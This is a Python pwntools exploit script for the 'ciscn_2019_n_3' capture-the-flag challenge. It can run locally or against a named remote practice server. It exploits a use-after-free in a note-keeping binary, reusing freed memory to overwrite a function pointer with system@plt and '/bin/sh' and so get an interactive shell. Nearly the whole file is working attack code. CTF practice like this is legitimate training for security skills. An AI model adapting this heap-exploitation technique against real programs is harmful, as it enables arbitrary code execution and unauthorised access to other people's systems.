# coding:utf-8
from pwn import *
context.log_level = 'debug'

proc_name = 'ciscn_2019_n_3'
islocal = 1
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elf = ELF(proc_name)

if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 6666)

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))


def new(idx, type, value, length=0):
    p.sendlineafter("CNote > ", '1')
    p.sendlineafter("Index > ", str(idx))
    p.recvuntil('> ')
    if type == 'integer':
        p.sendline('1')
        p.sendlineafter("Value > ", str(value))
    elif type == 'text':
        p.sendline('2')
        p.sendlineafter("Length > ", str(length))
        if length == 8:
            p.sendafter("Value > ", value)
        else:
            p.sendlineafter("Value > ", value)
    else:
        print("invalid choice!")
        exit()

def delete(idx):
	p.recvuntil("> ")
	p.sendline('2')
	p.recvuntil("> ")
	p.sendline(str(idx))

def show(idx):
    p.sendlineafter("CNote > ", '3')
    p.sendlineafter("Index > ", str(idx))

def purchase():
    p.sendlineafter("CNote > ", '4')

def pwn():
    # new(idx, type, length, value)
    new(0, "integer", "0")
    # debug(0)
    new(1, "integer", "1")
    # debug(0)
    new(2, "integer", "2")
    # debug(0)
    delete(0)
    # debug(0)
    delete(1)
    # debug(0)
    new(3, "text", b'/bin/sh\x00' + p32(elf.plt['system']), 0xc)     # system@plt -> free
    # debug(0)
    # pause()
    delete(0)
    # debug(0)
    # pause()
    p.interactive()


if __name__ == '__main__':
    pwn()

